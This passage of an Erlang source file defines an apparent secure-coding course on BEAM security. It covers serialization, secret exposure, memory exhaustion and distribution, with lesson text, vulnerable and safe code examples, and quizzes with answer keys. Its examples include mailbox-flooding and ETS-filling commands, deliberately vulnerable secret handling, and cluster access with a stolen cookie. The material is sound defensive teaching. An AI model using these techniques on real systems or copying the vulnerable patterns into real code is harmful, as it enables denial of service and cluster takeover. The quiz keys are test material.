                    #{id => <<"d">>, text => <<"Raw binary with custom parser">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "JSON and Protocol Buffers cannot encode atoms, funs, or "
                    "shared-term structures. They are inherently safer for external "
                    "data exchange. The Erlang external term format should be reserved "
                    "for trusted, internal communication."
                >>
            },
            #{
                id => <<"serial_q4">>,
                type => multiple_choice,
                prompt => <<
                    "How can a tampered BEAM file exploit binary_to_term?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"The Attr and CInf chunks are decoded with binary_to_term">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<"BEAM files do not use binary_to_term">>
                    },
                    #{
                        id => <<"c">>,
                        text => <<"Only the code chunk is affected">>
                    },
                    #{
                        id => <<"d">>,
                        text => <<"BEAM files are always cryptographically signed">>
                    }
                ],
                correct => <<"a">>,
                explanation => <<
                    "The BEAM file format stores module attributes (Attr) and "
                    "compilation info (CInf) as terms encoded with term_to_binary. "
                    "When the module is loaded, these chunks are decoded with "
                    "binary_to_term. A malicious dependency could craft these chunks "
                    "to contain harmful terms."
                >>
            }
        ]
    }.

sensitive_data_module() ->
    #{
        id => <<"sensitive_data">>,
        number => 5,
        title => <<"Sensitive Data Exposure">>,
        description => <<
            "Understand how the BEAM VM exposes sensitive data through "
            "process introspection, crash dumps, debugging tools, and "
            "garbage collection behaviour, and learn safe patterns to "
            "minimise secret lifetime and visibility."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"Memory and Garbage Collection">>,
                content => <<
                    "<p>The BEAM garbage collector does <strong>not scrub memory</strong> "
                    "after deallocation. When a process heap is collected, old values "
                    "remain in deallocated regions until overwritten by future allocations.</p>"
                    "<p>This means passwords, API keys, and session tokens linger in "
                    "process memory long after the variable goes out of scope. An attacker "
                    "with access to raw memory (e.g. via GDB attachment) can extract "
                    "crypto keys, session tokens, and other secrets from the BEAM process.</p>"
                    "<p>Off-heap binaries compound the problem: a sub-binary holds a "
                    "reference to its parent, keeping the <strong>entire parent binary</strong> "
                    "alive. If a large binary contains a secret somewhere inside it, "
                    "extracting a small piece still retains the full original.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Secret lingers after scope ends">>,
                        code => <<
                            "authenticate(Username, Password) ->\n"
                            "    %% Password stays in process heap after this\n"
                            "    %% function returns — GC does not scrub it\n"
                            "    Hash = crypto:hash(sha256, Password),\n"
                            "    case check_hash(Username, Hash) of\n"
                            "        ok -> {ok, generate_token()};\n"
                            "        error -> {error, invalid}\n"
                            "    end."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The Password binary remains in the process heap "
                            "after this function returns. The BEAM GC does not zero out "
                            "deallocated memory, so the plaintext password persists until "
                            "the memory region is reused."
                        >>,
                        output => <<"{ok, <<\"token_abc123\">>}">>
                    },
                    #{
                        title => <<"Sub-binary retains parent">>,
                        code => <<
                            "%% Large binary with embedded secret\n"
                            "Response = fetch_api_response(),\n"
                            "%% Extracting a sub-binary keeps parent alive\n"
                            "<<_Header:64/binary, Token:32/binary, _/binary>> = Response,\n"
                            "%% Token is a sub-binary — the entire Response\n"
                            "%% stays in memory as long as Token is referenced"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Sub-binaries reference their parent binary. Even "
                            "if you only keep Token, the full Response (which may "
                            "contain other secrets) remains alive in memory. Use "
                            "binary:copy/1 to detach from the parent."
                        >>,
                        output => <<"">>
                    }
                ]
            },
            #{
                title => <<"Process Introspection">>,
                content => <<
                    "<p><code>erlang:process_info/2</code> allows <strong>any process "
                    "on the node</strong> to inspect another process's internal state:</p>"
                    "<ul>"
                    "<li><code>process_info(Pid, backtrace)</code> &mdash; full stack trace "
                    "including local variable values</li>"
                    "<li><code>process_info(Pid, messages)</code> &mdash; all messages sitting "
                    "in the mailbox</li>"
                    "<li><code>process_info(Pid, dictionary)</code> &mdash; entire process "
                    "dictionary contents, which live for the process lifetime</li>"
                    "</ul>"
                    "<p>The Observer application and <code>sys:get_state/1</code> expose "
                    "the full internal state of any gen_server, gen_statem, or gen_event "
                    "process. If your server state holds database credentials, JWT signing "
                    "keys, or session secrets, they are visible to anyone who can connect "
                    "Observer or call <code>sys:get_state/1</code>.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Secrets exposed via process_info">>,
                        code => <<
                            "%% Storing secrets in process dictionary\n"
                            "init(Config) ->\n"
                            "    put(api_key, maps:get(api_key, Config)),\n"
                            "    {ok, #{}}.\n\n"
                            "%% ANY process on the node can read it:\n"
                            "erlang:process_info(Pid, dictionary).\n"
                            "%% => {dictionary, [{api_key, <<\"sk-live-abc123\">>}]}"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The process dictionary is fully visible via "
                            "process_info/2. Any process on the same node can read "
                            "secrets stored this way. The data also persists for the "
                            "entire lifetime of the process."
                        >>,
                        output => <<"{dictionary, [{api_key, <<\"sk-live-abc123\">>}]}">>
                    },
                    #{
                        title => <<"Vulnerable: gen_server state visible via sys">>,
                        code => <<
                            "-module(auth_server).\n"
                            "-behaviour(gen_server).\n\n"
                            "init([SigningKey]) ->\n"
                            "    {ok, #{signing_key => SigningKey,\n"
                            "           sessions => #{}}}.\n\n"
                            "%% Anyone can inspect the full state:\n"
                            "sys:get_state(auth_server).\n"
                            "%% => #{signing_key => <<\"super_secret\">>,\n"
                            "%%      sessions => #{...}}"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "sys:get_state/1 returns the complete state of any "
                            "OTP behaviour process. Observer uses this same mechanism. "
                            "If your gen_server state contains secrets, they are exposed "
                            "to any local process or connected observer."
                        >>,
                        output => <<
                            "#{signing_key => <<\"super_secret\">>,\n"
                            "  sessions => #{...}}"
                        >>
                    }
                ]
            },
            #{
                title => <<"Crash Dumps">>,
                content => <<
                    "<p>When the BEAM VM crashes, it writes an <code>erl_crash.dump</code> "
                    "file that is a <strong>full disclosure of the system state</strong>:</p>"
                    "<ul>"
                    "<li><strong>Process heaps</strong> &mdash; all data held by every process, "
                    "including secrets in gen_server state</li>"
                    "<li><strong>Message queues</strong> &mdash; every message waiting in every "
                    "process mailbox</li>"
                    "<li><strong>ETS table metadata</strong> &mdash; table names, sizes, and in "
                    "some cases data</li>"
                    "<li><strong>System configuration</strong> &mdash; application env, VM flags, "
                    "cookie value</li>"
                    "</ul>"
                    "<p>Crash dumps are written in <strong>plaintext</strong>. If crash dumps "
                    "are collected by a logging service, stored on shared filesystems, or "
                    "included in bug reports, secrets are leaked.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Crash dump exposes process state">>,
                        code => <<
                            "%% A gen_server holding DB credentials crashes.\n"
                            "%% The erl_crash.dump now contains:\n"
                            "%%\n"
                            "%% =proc:<0.234.0>\n"
                            "%% State: #{db_password => <<\"hunter2\">>,\n"
                            "%%          db_host => <<\"prod-db.internal\">>}\n"
                            "%%\n"
                            "%% This file is world-readable by default."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Crash dumps contain the full state of every process "
                            "in plaintext. Database passwords, API keys, and session "
                            "tokens are all exposed. Restrict file permissions and "
                            "never include crash dumps in bug reports without redaction."
                        >>,
                        output => <<"">>
                    }
                ]
            },
            #{
                title => <<"Safe Patterns">>,
                content => <<
                    "<p>Apply these patterns to reduce sensitive data exposure:</p>"
                    "<ul>"
                    "<li><strong>Wrap secrets in closures</strong> &mdash; "
                    "<code>fun() -> Secret end</code> hides the value from "
                    "process_info, sys:get_state, and crash dumps</li>"
                    "<li><strong>Minimise secret lifetime</strong> &mdash; fetch secrets "
                    "only when needed and discard immediately after use</li>"
                    "<li><strong>Avoid the process dictionary</strong> for secrets &mdash; "
                    "it lives for the entire process lifetime and is fully visible</li>"
                    "<li><strong>Copy sub-binaries</strong> with <code>binary:copy/1</code> "
                    "to detach from parent binaries containing secrets</li>"
                    "<li><strong>Scrub state in terminate/2</strong> &mdash; overwrite "
                    "sensitive fields before the process exits</li>"
                    "<li><strong>Use crypto:strong_rand_bytes/1</strong> not "
                    "<code>rand</code> for tokens and keys &mdash; <code>rand</code> "
                    "is predictable</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Safe: Wrapping secrets in closures">>,
                        code => <<
                            "init(Config) ->\n"
                            "    Key = maps:get(signing_key, Config),\n"
                            "    %% Wrap in closure — opaque to process_info,\n"
                            "    %% sys:get_state, and crash dumps\n"
                            "    KeyFun = fun() -> Key end,\n"
                            "    {ok, #{get_key => KeyFun, sessions => #{}}}.\n\n"
                            "sign_token(Token, #{get_key := GetKey}) ->\n"
                            "    Key = GetKey(),\n"
                            "    crypto:mac(hmac, sha256, Key, Token)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Wrapping the secret in a closure makes it opaque "
                            "to introspection tools. sys:get_state/1 shows #Fun "
                            "rather than the secret value. The secret is only "
                            "materialised when the closure is called."
                        >>,
                        output => <<"<<186,23,45,...>>">>
                    },
                    #{
                        title => <<"Safe: Scrubbing state in terminate/2">>,
                        code => <<
                            "terminate(_Reason, State) ->\n"
                            "    %% Overwrite sensitive fields before exit\n"
                            "    Scrubbed = State#{\n"
                            "        get_key => fun() -> <<>> end,\n"
                            "        sessions => #{}\n"
                            "    },\n"
                            "    %% Force use to prevent compiler optimising away\n"
                            "    _ = Scrubbed,\n"
                            "    ok."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Scrubbing sensitive fields in terminate/2 reduces "
                            "the window where secrets appear in crash dumps. While "
                            "not perfect (the old values may still be in the heap), "
                            "it prevents the most obvious exposure path."
                        >>,
                        output => <<"ok">>
                    },
                    #{
                        title => <<"Safe: crypto vs rand for secrets">>,
                        code => <<
                            "%% WRONG: rand is predictable if seed is known\n"
                            "Token = list_to_binary(\n"
                            "    [rand:uniform(256) - 1 || _ <- lists:seq(1, 32)]\n"
                            "),\n\n"
                            "%% CORRECT: cryptographically secure\n"
                            "Token = crypto:strong_rand_bytes(32)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "The rand module uses a deterministic PRNG. If an "
                            "attacker learns the seed (via process_info or crash dump), "
                            "they can predict all future tokens. "
                            "crypto:strong_rand_bytes/1 uses the OS CSPRNG."
                        >>,
                        output => <<"<<71,204,13,...>>">>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"sensitive_q1">>,
                type => multiple_choice,
                prompt => <<
                    "Why do secrets persist in BEAM process memory after "
                    "going out of scope?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"The BEAM uses reference counting instead of GC">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "The GC does not scrub deallocated heap regions — "
                            "old values remain until overwritten"
                        >>
                    },
                    #{id => <<"c">>, text => <<"Erlang variables are mutable and cached">>},
                    #{id => <<"d">>, text => <<"The compiler inlines all string constants">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The BEAM garbage collector reclaims memory but does "
                    "not zero it out. Deallocated heap regions retain their "
                    "previous contents until the memory is reused by a future "
                    "allocation. An attacker with raw memory access (e.g. GDB) "
                    "can read these stale values."
                >>
            },
            #{
                id => <<"sensitive_q2">>,
                type => multiple_choice,
                prompt => <<
                    "Which technique best hides a secret from sys:get_state/1 "
                    "and crash dumps?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Store it in the process dictionary">>},
                    #{id => <<"b">>, text => <<"Store it in an ETS table">>},
                    #{id => <<"c">>, text => <<"Wrap it in a closure: fun() -> Secret end">>},
                    #{id => <<"d">>, text => <<"Encode it with base64">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "Wrapping a secret in a closure makes it opaque to "
                    "introspection tools. sys:get_state/1 and crash dumps show "
                    "#Fun rather than the actual value. The process dictionary "
                    "is fully visible via process_info/2, ETS metadata appears "
                    "in crash dumps, and base64 is encoding, not protection."
                >>
            },
            #{
                id => <<"sensitive_q3">>,
                type => true_false,
                prompt => <<
                    "A crash dump file contains only the stack traces of "
                    "crashed processes, not the data from healthy ones."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "Crash dumps contain the heap and state of every "
                    "process on the node, not just the one that crashed. "
                    "Message queues, ETS metadata, system configuration, and "
                    "the distribution cookie are all included in plaintext."
                >>
            },
            #{
                id => <<"sensitive_q4">>,
                type => multiple_choice,
                prompt => <<
                    "Why should you avoid using the rand module for "
                    "generating security tokens?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"rand is too slow for token generation">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "rand uses a deterministic PRNG — if the seed is known, "
                            "all outputs are predictable"
                        >>
                    },
                    #{id => <<"c">>, text => <<"rand only produces integers, not binaries">>},
                    #{id => <<"d">>, text => <<"rand is deprecated in OTP 26+">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The rand module uses a deterministic pseudo-random "
                    "number generator. If an attacker can discover the seed "
                    "(e.g. via process_info or a crash dump), they can predict "
                    "all future outputs. Use crypto:strong_rand_bytes/1 which "
                    "draws from the operating system's CSPRNG."
                >>
            }
        ]
    }.

memory_exhaustion_module() ->
    #{
        id => <<"memory_exhaustion">>,
        number => 6,
        title => <<"Memory Exhaustion Attacks">>,
        description => <<
            "Understand how Erlang processes and data structures can be exploited "
            "to exhaust system memory, and learn defensive patterns for message queues, "
            "binaries, ETS tables, and selective receive."
        >>,
        estimated_minutes => 25,
        sections => [
            #{
                title => <<"Message Queue Flooding">>,
                content => <<
                    "<p>Every Erlang process has an unbounded mailbox. If a process receives "
                    "messages faster than it can handle them, the mailbox grows without limit, "
                    "consuming heap memory until the system runs out.</p>"
                    "<p>Registered processes are especially vulnerable because any process "
                    "on the node (or cluster) can send them messages by name. A slow "
                    "<code>handle_call</code> or blocking operation creates backpressure that "
                    "fills the queue.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Slow gen_server with unbounded mailbox">>,
                        code => <<
                            "-module(slow_worker).\n"
                            "-behaviour(gen_server).\n\n"
                            "handle_call({process, Data}, _From, State) ->\n"
                            "    %% DANGEROUS: slow operation blocks the process\n"
                            "    %% while messages pile up in the mailbox\n"
                            "    Result = expensive_computation(Data),\n"
                            "    {reply, Result, State}.\n\n"
                            "%% Attacker floods the registered process:\n"
                            "%% [gen_server:cast(slow_worker, {junk, N})\n"
                            "%%  || N <- lists:seq(1, 10000000)]."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The gen_server processes calls sequentially. While it handles "
                            "one slow call, all incoming casts and messages accumulate in the "
                            "mailbox. With a registered name, any process can flood it."
                        >>,
                        output => <<
                            "** exception exit: {killed, {gen_server, call, ...}}\n"
                            "%% Process killed by OOM"
                        >>
                    },
                    #{
                        title => <<"Safe: Message queue monitoring">>,
                        code => <<
                            "handle_info(check_health, State) ->\n"
                            "    {message_queue_len, Len} =\n"
                            "        process_info(self(), message_queue_len),\n"
                            "    case Len > 10000 of\n"
                            "        true ->\n"
                            "            logger:warning(\"Queue overflow: ~p\", [Len]),\n"
                            "            %% Shed load: flush non-essential messages\n"
                            "            flush_mailbox(Len - 1000),\n"
                            "            {noreply, State};\n"
                            "        false ->\n"
                            "            {noreply, State}\n"
                            "    end.\n\n"
                            "flush_mailbox(0) -> ok;\n"
                            "flush_mailbox(N) ->\n"
                            "    receive _ -> flush_mailbox(N - 1)\n"
                            "    after 0 -> ok\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Periodically checking the message queue length and shedding "
                            "excess messages prevents unbounded growth. Use a timer to trigger "
                            "health checks and set a threshold appropriate for your workload."
                        >>,
                        output => <<"ok">>
                    }
                ]
            },
            #{
                title => <<"Binary Reference Leaks">>,
                content => <<
                    "<p>Binaries larger than 64 bytes are stored on a shared heap as "
                    "<strong>reference-counted (refc) binaries</strong>. A process holds only "
                    "a small pointer to the binary data.</p>"
                    "<p>The problem: taking a <strong>sub-binary</strong> (via pattern matching "
                    "or <code>binary:part/3</code>) creates a reference to the <strong>entire "
                    "parent binary</strong>. A 10-byte slice of a 10 MB binary keeps all 10 MB "
                    "alive as long as the sub-binary is referenced.</p>"
                    "<p>Forwarding processes that extract a small piece of a large binary and "
                    "hold it in state &mdash; or pass it to a long-lived process &mdash; "
                    "cause massive memory amplification.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Sub-binary keeps parent alive">>,
                        code => <<
                            "extract_header(<<Header:10/binary, _Rest/binary>>) ->\n"
                            "    %% DANGEROUS: Header is a sub-binary reference\n"
                            "    %% to the entire original binary\n"
                            "    Header.\n\n"
                            "%% If the original binary is 10 MB,\n"
                            "%% this 10-byte header keeps all 10 MB alive."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The 10-byte Header is a sub-binary pointing into the "
                            "original large binary. As long as Header is reachable, the "
                            "entire parent binary cannot be garbage collected."
                        >>,
                        output => <<"<<72,84,84,80,47,49,46,49,32,50>>">>
                    },
                    #{
                        title => <<"Safe: binary:copy/1 to break reference">>,
                        code => <<
                            "extract_header(<<Header:10/binary, _Rest/binary>>) ->\n"
                            "    %% SAFE: creates an independent copy\n"
                            "    binary:copy(Header).\n\n"
                            "%% The copy is a standalone 10-byte binary.\n"
                            "%% The original large binary can be GC'd."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "binary:copy/1 creates a new, independent binary that does "
                            "not reference the parent. The original large binary becomes eligible "
                            "for garbage collection once no other references exist."
                        >>,
                        output => <<"<<72,84,84,80,47,49,46,49,32,50>>">>
                    }
                ]
            },
            #{
                title => <<"ETS Unbounded Writes and Selective Receive DoS">>,
                content => <<
                    "<p><strong>ETS tables</strong> are stored off-heap. They do not create "
                    "per-process GC pressure, which makes them invisible to process-level "
                    "memory monitoring. An attacker who can trigger ETS inserts without "
                    "eviction will exhaust system memory.</p>"
                    "<p><strong>Selective receive</strong> is another vector. When a process "
                    "uses a <code>receive</code> that matches only specific messages, the VM "
                    "scans the entire mailbox on every receive. Non-matching messages accumulate, "
                    "causing O(n) scan time per receive and growing memory usage.</p>"
                    "<p>Additionally, <strong>strings as lists</strong> consume 16 bytes per "
                    "character on 64-bit systems (one word for the value, one for the list "
                    "pointer). A 1 MB UTF-8 binary becomes roughly 16 MB as a list. Always "
                    "prefer binaries for text data from untrusted sources.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Unbounded ETS cache">>,
                        code => <<
                            "cache_put(Key, Value) ->\n"
                            "    %% DANGEROUS: no size limit, no eviction\n"
                            "    ets:insert(my_cache, {Key, Value}).\n\n"
                            "%% Attacker inserts millions of unique keys:\n"
                            "%% [cache_put(N, crypto:strong_rand_bytes(1024))\n"
                            "%%  || N <- lists:seq(1, 5000000)]."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "ETS tables have no built-in size limit. Without eviction "
                            "logic, an attacker can fill the table until system memory is "
                            "exhausted. ETS memory is not visible in process_info reports."
                        >>,
                        output => <<
                            "** exception error: system_limit\n"
                            "%% System out of memory"
                        >>
                    },
                    #{
                        title => <<"Safe: Bounded ETS cache with eviction">>,
                        code => <<
                            "-define(MAX_CACHE_SIZE, 100000).\n\n"
                            "cache_put(Key, Value) ->\n"
                            "    case ets:info(my_cache, size) of\n"
                            "        Size when Size >= ?MAX_CACHE_SIZE ->\n"
                            "            evict_oldest(my_cache),\n"
                            "            ets:insert(my_cache, {Key, Value});\n"
                            "        _ ->\n"
                            "            ets:insert(my_cache, {Key, Value})\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Checking the table size before inserting and evicting entries "
                            "when the limit is reached prevents unbounded growth. Consider "
                            "using an LRU strategy or TTL-based expiration."
                        >>,
                        output => <<"true">>
                    },
                    #{
                        title => <<"Vulnerable: Selective receive accumulation">>,
                        code => <<
                            "wait_for_response(Ref) ->\n"
                            "    %% DANGEROUS: non-matching messages stay in mailbox\n"
                            "    %% causing O(n) scan per receive attempt\n"
                            "    receive\n"
                            "        {response, Ref, Result} -> Result\n"
                            "    end.\n\n"
                            "%% If attacker sends thousands of non-matching messages,\n"
                            "%% each receive scans the entire backlog."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Each receive scans all accumulated messages looking for a "
                            "match. With thousands of non-matching messages, this becomes "
                            "O(n) per receive and the messages consume growing memory."
                        >>,
                        output => <<"%% Process becomes unresponsive">>
                    },
                    #{
                        title => <<"Safe: Catch-all with timeout">>,
                        code => <<
                            "wait_for_response(Ref) ->\n"
                            "    receive\n"
                            "        {response, Ref, Result} ->\n"
                            "            Result;\n"
                            "        _Other ->\n"
                            "            %% Discard non-matching messages\n"
                            "            wait_for_response(Ref)\n"
                            "    after 5000 ->\n"
                            "        {error, timeout}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "A catch-all clause drains non-matching messages, preventing "
                            "accumulation. The timeout ensures the process does not block "
                            "indefinitely if the expected response never arrives."
                        >>,
                        output => <<"{ok, result_value}">>
                    }
                ]
            },
            #{
                title => <<"Monitoring and Detection">>,
                content => <<
                    "<p>Proactive monitoring is essential for detecting memory exhaustion "
                    "before it causes an outage:</p>"
                    "<ul>"
                    "<li><code>erlang:memory()</code> &mdash; returns memory usage by category "
                    "(total, processes, ets, binary, atom, system)</li>"
                    "<li><code>erlang:system_info(allocated_areas)</code> &mdash; detailed "
                    "allocator statistics</li>"
                    "<li><code>process_info(Pid, memory)</code> &mdash; per-process memory "
                    "in bytes (heap + stack + mailbox)</li>"
                    "<li><code>process_info(Pid, message_queue_len)</code> &mdash; mailbox "
                    "depth for detecting queue flooding</li>"
                    "<li><code>process_info(Pid, binary)</code> &mdash; list of refc binaries "
                    "held by a process</li>"
                    "<li><code>ets:info(Tab, memory)</code> &mdash; words allocated to an ETS "
                    "table (multiply by word size for bytes)</li>"
                    "</ul>"
                    "<p>For unbounded data structures from untrusted input, always impose "
                    "size limits. Lists and bignums have no inherent bounds &mdash; a malicious "
                    "payload could construct arbitrarily large terms.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Memory monitoring snapshot">>,
                        code => <<
                            "memory_report() ->\n"
                            "    Mem = erlang:memory(),\n"
                            "    Top = top_processes_by_memory(10),\n"
                            "    EtsTables = [{Tab, ets:info(Tab, memory)}\n"
                            "                 || Tab <- ets:all()],\n"
                            "    #{system => Mem,\n"
                            "      top_processes => Top,\n"
                            "      ets_tables => EtsTables}.\n\n"
                            "top_processes_by_memory(N) ->\n"
                            "    Procs = [{Pid, element(2, process_info(Pid, memory))}\n"
                            "             || Pid <- processes()],\n"
                            "    lists:sublist(\n"
                            "        lists:reverse(lists:keysort(2, Procs)), N)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Combining system-level memory stats, per-process memory "
                            "rankings, and ETS table sizes gives a comprehensive view. "
                            "Run this periodically or expose it via a health endpoint."
                        >>,
                        output => <<
                            "#{system => [{total, 48293376}, {processes, 12841984}, ...],\n"
                            "  top_processes => [{<0.45.0>, 2621440}, ...],\n"
                            "  ets_tables => [{my_cache, 524288}, ...]}"
                        >>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"mem_q1">>,
                type => multiple_choice,
                prompt => <<
                    "A gen_server with a registered name is receiving casts faster than it "
                    "can process them. What is the primary risk?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"The process will crash with a badarg error">>},
                    #{id => <<"b">>, text => <<"Messages are silently dropped">>},
                    #{
                        id => <<"c">>,
                        text => <<
                            "The mailbox grows without bound, consuming heap memory until OOM"
                        >>
                    },
                    #{id => <<"d">>, text => <<"The BEAM scheduler becomes unresponsive">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "Erlang mailboxes are unbounded. Messages are never dropped "
                    "automatically. When a process cannot keep up, messages accumulate in "
                    "the mailbox, growing the process heap until the system runs out of memory."
                >>
            },
            #{
                id => <<"mem_q2">>,
                type => multiple_choice,
                prompt => <<
                    "Why does extracting a small sub-binary from a large binary cause "
                    "a memory leak?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"Sub-binaries are always copied to the process heap">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<
                            "The sub-binary holds a reference to the entire parent binary, "
                            "preventing its garbage collection"
                        >>
                    },
                    #{id => <<"c">>, text => <<"Binary pattern matching is inherently unsafe">>},
                    #{id => <<"d">>, text => <<"The BEAM cannot garbage collect binaries">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Sub-binaries are pointers into the parent binary's data. Even a "
                    "1-byte sub-binary keeps the entire parent alive. Use binary:copy/1 to "
                    "create an independent copy when storing small slices long-term."
                >>
            },
            #{
                id => <<"mem_q3">>,
                type => true_false,
                prompt => <<
                    "ETS table memory is tracked by process_info(Pid, memory) for "
                    "the process that owns the table."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "ETS data is stored off-heap in a separate memory area. It does "
                    "not appear in process_info memory reports. Use ets:info(Tab, memory) "
                    "to monitor ETS memory usage and erlang:memory(ets) for total ETS memory."
                >>
            },
            #{
                id => <<"mem_q4">>,
                type => multiple_choice,
                prompt => <<
                    "What is the danger of a selective receive that only matches "
                    "specific message patterns?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"Non-matching messages are automatically discarded">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<
                            "Non-matching messages accumulate, causing O(n) mailbox scans "
                            "and growing memory usage"
                        >>
                    },
                    #{id => <<"c">>, text => <<"The process enters an infinite loop">>},
                    #{id => <<"d">>, text => <<"The VM converts non-matching messages to atoms">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Non-matching messages remain in the mailbox. Each subsequent "
                    "receive must scan past all accumulated messages, degrading to O(n) "
                    "per receive. Add a catch-all clause or use after-timeouts to prevent "
                    "this accumulation."
                >>
            }
        ]
    }.

distribution_module() ->
    #{
        id => <<"distribution">>,
        number => 7,
        title => <<"Distribution & Networking Security">>,
        description => <<
            "Understand the security risks of Erlang's distributed computing model, "
            "from cookie-based authentication to unrestricted RPC, and learn how to "
            "harden production clusters."
        >>,
        estimated_minutes => 25,
        sections => [
            #{
                title => <<"Cookie Authentication & EPMD">>,
                content => <<
                    "<p>Erlang distribution authenticates nodes using a shared secret called "
                    "the <strong>magic cookie</strong>. This cookie is stored in plaintext at "
                    "<code>~/.erlang.cookie</code> and is the <strong>only</strong> barrier between "
                    "an attacker and full code execution on your cluster.</p>"
                    "<ul>"
                    "<li>The cookie is a <strong>plaintext shared passphrase</strong> with no "
                    "expiry or rotation mechanism</li>"
                    "<li>By default, distribution traffic (including the cookie challenge) is "
                    "<strong>unencrypted</strong></li>"
                    "<li>All nodes in a cluster share the <strong>same cookie</strong></li>"
                    "</ul>"
                    "<p>Meanwhile, <strong>EPMD</strong> (Erlang Port Mapper Daemon) listens on "
                    "port 4369 and freely tells anyone which nodes are running and on which ports. "
                    "An attacker can enumerate your entire cluster topology with a single TCP "
                    "connection.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Cookie stored in plaintext">>,
                        code => <<
                            "%% The cookie file has no encryption\n"
                            "%% $ cat ~/.erlang.cookie\n"
                            "%% MYSECRETCOOKIE\n"
                            "%%\n"
                            "%% Anyone who reads this file can connect to your nodes:\n"
                            "erlang:set_cookie(node(), 'MYSECRETCOOKIE').\n"
                            "net_adm:ping('target@192.168.1.10').\n"
                            "%% => pong  (full access granted)"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The cookie is a plaintext file with mode 0400. Anyone with "
                            "read access to the file or network traffic can extract it and "
                            "connect to the cluster with full privileges."
                        >>,
                        output => <<"pong">>
                    },
                    #{
                        title => <<"EPMD information disclosure">>,
                        code => <<
                            "%% EPMD freely maps node names to ports\n"
                            "%% $ epmd -names\n"
                            "%% name myapp at port 45231\n"
                            "%% name db_node at port 39102\n"
                            "%%\n"
                            "%% Or programmatically:\n"
                            "erl_epmd:names(\"192.168.1.10\").\n"
                            "%% => {ok, [{\"myapp\", 45231}, {\"db_node\", 39102}]}"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "EPMD on port 4369 provides a directory of all running "
                            "Erlang nodes and their distribution ports to any client. An attacker "
                            "can use this to map cluster topology before attempting connection."
                        >>,
                        output => <<"{ok, [{\"myapp\", 45231}, {\"db_node\", 39102}]}">>
                    }
                ]
            },
            #{
                title => <<"Full Mesh & Unrestricted RPC">>,
                content => <<
                    "<p>By default, Erlang clusters form a <strong>full mesh</strong>: connecting "
                    "to one node automatically connects you to every other node in the cluster. "
                    "Combined with <code>rpc:call/4</code>, this means a single compromised node "
                    "gives an attacker <strong>arbitrary code execution on every node</strong>.</p>"
                    "<ul>"
                    "<li><code>-connect_all true</code> (the default) auto-connects to all known nodes</li>"
                    "<li><code>rpc:call/4</code> executes <strong>any</strong> function on any connected "
                    "node with no restrictions</li>"
                    "<li>There is no built-in authorization layer &mdash; all connected nodes are "
                    "fully trusted</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Full mesh auto-connection">>,
                        code => <<
                            "%% Connect to one node...\n"
                            "net_adm:ping('app@server1').\n"
                            "%% => pong\n\n"
                            "%% ...and you're automatically connected to ALL nodes\n"
                            "nodes().\n"
                            "%% => ['app@server1', 'app@server2', 'db@server3',\n"
                            "%%     'cache@server4', 'admin@server5']"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "With -connect_all true (the default), connecting to a single "
                            "node transitively connects you to every node in the cluster. One "
                            "compromised node means the entire cluster is compromised."
                        >>,
                        output => <<
                            "['app@server1', 'app@server2', 'db@server3', "
                            "'cache@server4', 'admin@server5']"
                        >>
                    },
                    #{
                        title => <<"Arbitrary code execution via RPC">>,
                        code => <<
